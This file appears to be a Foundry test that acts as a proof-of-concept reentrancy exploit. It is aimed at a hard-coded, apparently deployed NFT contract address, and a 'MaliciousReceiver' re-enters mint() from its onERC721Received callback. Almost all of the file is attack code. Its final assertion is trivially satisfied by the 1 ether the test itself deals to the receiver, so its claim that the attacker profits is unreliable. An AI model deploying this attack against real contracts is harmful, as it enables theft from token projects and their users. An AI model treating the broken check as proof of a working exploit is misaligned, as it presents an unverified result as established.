pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IGuitarist {
    function mint(uint256 quantity) external payable;
    function public_mint_status() external view returns (bool);
    function publicSaleCost() external view returns (uint256);
    function treasuryWallet() external view returns (address);
}

interface IERC721Receiver {
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4);
}

contract MaliciousReceiver {
    IGuitarist public guitarist;
    uint256 public reentrancyCount;
    uint256 public maxReentrancy;

    constructor(IGuitarist _guitarist) {
        guitarist = _guitarist;
        maxReentrancy = 3;
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4) {
        reentrancyCount++;

        // Reenter mint function if we haven't hit max reentrancy
        if (reentrancyCount < maxReentrancy) {
            guitarist.mint{value: 0.05 ether}(1);
        }

        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xA249d8F280BA32Ab3E95bDdf4F3DBDE059d62AC3;
    address attacker;
    MaliciousReceiver public receiver;
    uint256 public reentrancyCount;
    uint256 public maxReentrancy = 3;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        attacker = address(this);
        vm.deal(attacker, 10 ether);
        IGuitarist guitarist = IGuitarist(TARGET);
        receiver = new MaliciousReceiver(IGuitarist(TARGET));
        vm.label(TARGET, "Guitarist Contract");
        vm.label(address(receiver), "Malicious Receiver");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 attackerBalanceBefore = attacker.balance;

        // Fund the malicious receiver contract
        vm.deal(address(receiver), 1 ether);

        // Have the malicious receiver call mint() - this triggers onERC721Received on itself
        vm.prank(address(receiver));
        IGuitarist(TARGET).mint{value: 0.05 ether}(1);

        uint256 attackerBalanceAfter = attacker.balance;
        uint256 receiverBalance = address(receiver).balance;

        // The attacker should profit from the reentrancy exploit
        // Either through direct ETH gain or through the receiver contract
        assertGt(attackerBalanceBefore + receiverBalance, attackerBalanceBefore, "Attacker should profit from reentrancy");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

